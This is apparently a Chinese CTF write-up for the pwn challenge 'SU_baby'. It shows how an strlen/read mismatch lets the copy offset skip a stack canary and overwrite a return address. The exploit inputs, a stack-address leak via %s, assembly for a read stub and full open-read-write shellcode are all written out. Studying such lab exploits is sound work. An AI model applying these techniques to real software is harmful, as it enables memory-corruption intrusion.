# SU_baby

## 题目简述

`ASU1` 是一个 64 位、动态链接且未去符号的 ELF。保护情况为 Full RELRO、Stack Canary、No PIE；二进制缺少 `GNU_STACK` 标记，栈可执行，并且存在 RWX 段。程序模拟特征库与文件扫描，真正的漏洞位于 `add_files()`：函数把每轮输入先读入临时缓冲区，再依据一个累计偏移复制到同一栈帧中的文件内容缓冲区。

本题不是直接覆盖 Canary 的普通栈溢出。利用时需要操纵字符串终止位置，使累计偏移跳过 Canary、只改写保存的返回地址，再借固定地址的 `attack()` 完成两阶段 shellcode 执行。

## 解题过程

`add_files()` 中与漏洞有关的逻辑可还原为：

```c
char tmp[16];
char content[32];
int offset = 0;

for (...) {
    int n = read(0, tmp, 9);
    strncpy(content + offset, tmp, n);
    int len = strlen(tmp);
    offset += len + 1;
}
```

`read()` 不会自动补 `\0`，但程序随后直接对 `tmp` 调用 `strlen()`。当本轮输入没有空字节时，`strlen()` 会继续扫描临近的栈内容；前几轮留下的数据又会改变它遇到第一个 `\0` 的位置。于是攻击者不仅可以写入 `content`，还可以间接控制下一轮写入的 `offset`。

官方 exp 使用下面的输入序列逐步移动写指针：

```python
add_file(b"a" * 4 + b"\x00")
add_file(b"a" * 6 + b"\x00")
add_file(b"a" * 6 + b"\x00")
add_file(b"a" * 7)
add_file(b"b")
add_file(b"c" * 6 + b"\x00")
add_file(p64(0x400f56))  # attack
```

动态观察栈布局可以确认：前几次写入和 `strlen()` 的越界计数让最后一次复制落到保存的返回地址，而位于 `rbp-0x8` 的 Canary 没有被修改。由于程序 No PIE，`attack()` 地址固定为 `0x400f56`。

在劫持控制流前还需要得到本次连接的栈地址。程序保存特征码时允许构造一段不带正常终止符的数据，后续扫描/显示路径使用 `%s` 输出，会把相邻指针一并打印出来。官方脚本先添加特征：

```python
add_id(b"22", b"xx", b"aa" + b"a" * 0x26 + b"cc")
```

再进入扫描功能，从返回内容末尾取出形如 `0x7f...` 的六字节指针：

```python
leak = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
stack_base = leak - 0x1ed50
stage1_addr = stack_base + 0x14068 - 0x590
```

这些差值来自附件版本的实际栈布局，远程环境变化时应重新用调试器核对，不能把它们当成通用常量。

`attack()` 本身提供了一个很有用的调用入口：

```c
read(0, stack_buf, 12);
read(0, global_buf, 9);
shellcode(global_buf);
```

而 `shellcode()` 会把 `global_buf` 开头的八字节解释成函数地址并调用。利用流程因此分为两阶段：

1. 第一次 `read()` 把一个很短的读取桩写入可执行栈；
2. 第二次 `read()` 把该读取桩地址写入全局缓冲区；
3. 间接调用读取桩，再把完整 ORW shellcode 读到栈上；
4. ORW shellcode 打开 `flag`、读取内容并写到标准输出。

第一阶段读取桩为：

```asm
xor edi, edi
xchg rsi, rdx
add rsi, 0xb
syscall
```

第二阶段不依赖 `/bin/sh`，直接执行：

```python
shellcode = asm("""
    xor rsi, rsi
    push 0x67616c66
    mov rdi, rsp
    push 2
    pop rax
    syscall

    mov rsi, rdi
    mov edi, 3
    mov edx, 0x50
    xor eax, eax
    syscall

    push 1
    pop rdi
    push rsp
    pop rsi
    push 0x50
    pop rdx
    push 1
    pop rax
    syscall
""")
```

完成返回地址覆盖后，依次发送短读取桩、`stage1_addr` 和上述 ORW shellcode，即可读出动态 flag。

## 方法总结

本题的核心是“字符串长度计算”和“实际复制长度”来自不同来源：复制长度由 `read()` 返回值决定，下一轮目的地址却由可能越界的 `strlen()` 决定。利用结果不是简单地跨过整个栈帧，而是精确调整每轮偏移，保留 Canary 并覆盖返回地址。

遇到类似逻辑时，应逐轮记录临时缓冲区内容、第一个空字节位置、累计偏移和写入区间。保护检查也必须与实际利用对应：Canary 存在不代表一定要泄露 Canary；No PIE 让 `attack()` 地址固定；可执行栈和间接调用入口则把控制流劫持转成两阶段 shellcode。最终脚本中的栈差值具有环境依赖性，复现时应以本地附件和远程所用 libc/启动方式为准。
